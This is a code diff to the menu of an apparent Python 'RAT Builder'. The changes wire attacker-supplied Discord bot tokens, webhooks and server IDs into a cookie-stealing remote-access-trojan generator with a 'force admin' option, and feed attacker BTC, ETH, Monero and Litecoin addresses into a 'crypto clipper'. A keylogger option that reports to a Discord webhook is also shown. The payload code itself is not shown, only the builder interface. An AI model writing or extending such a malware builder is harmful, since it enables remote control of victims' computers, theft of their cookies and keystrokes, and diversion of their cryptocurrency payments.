@@ -23,11 +23,17 @@ def main():
  
     if choice == '1':       # Create PayLoad
         clear()
-        filename = str(input(
+        token = str(input(
+            f'{Fore.CYAN}Enter discord bot token {Fore.YELLOW}>> {Fore.RESET}'))
+        webhook = str(input(
+            f'{Fore.CYAN}Enter discord webhook {Fore.YELLOW}>> {Fore.RESET}'))
+        serverID = str(input(
+            f'{Fore.CYAN}Enter discord server ID {Fore.YELLOW}>> {Fore.RESET}'))
+        fileName = str(input(
             f'{Fore.CYAN}Enter output filename {Fore.YELLOW}>> {Fore.RESET}'))
         force_admin = str(input(
             f'{Fore.CYAN}Do u want the payload to create with force admin {Fore.YELLOW}>> {Fore.RESET}'))
-        CookiesRAT(filename, force_admin)
+        CookiesRAT(token, webhook, serverID, fileName, force_admin)
         main()
 
     elif choice == '2':     # Create Custom PayLoad
@@ -41,7 +47,7 @@ def main():
         webhook = str(input(
             f'{Fore.CYAN}Enter discord webhook {Fore.YELLOW}>> {Fore.RESET}'))
         intervals = str(input(
-            f'{Fore.CYAN}Enter intervals (default 60s) {Fore.YELLOW}>> {Fore.RESET}'))
+            f'{Fore.CYAN}Enter intervals (default 60) {Fore.YELLOW}>> {Fore.RESET}'))
         Create_KeyLogger(webhook, intervals)
         main()
 
@@ -54,7 +60,15 @@ def main():
 
     elif choice == '5':     # Create Crypto Clipper Add on
         clear()
-        Create_Crypto_Clipper()
+        btc = str(input(
+            f'{Fore.CYAN}Enter BTC address {Fore.YELLOW}>> {Fore.RESET}'))
+        eth = str(input(
+            f'{Fore.CYAN}Enter ETH address {Fore.YELLOW}>> {Fore.RESET}'))
+        mon = str(input(
+            f'{Fore.CYAN}Enter MONERO address {Fore.YELLOW}>> {Fore.RESET}'))
+        ltc = str(input(
+            f'{Fore.CYAN}Enter LTC address {Fore.YELLOW}>> {Fore.RESET}'))
+        Create_Crypto_Clipper(btc, eth, mon, ltc)
         main()
 
     elif choice == '420':   # Exit RAT Builder
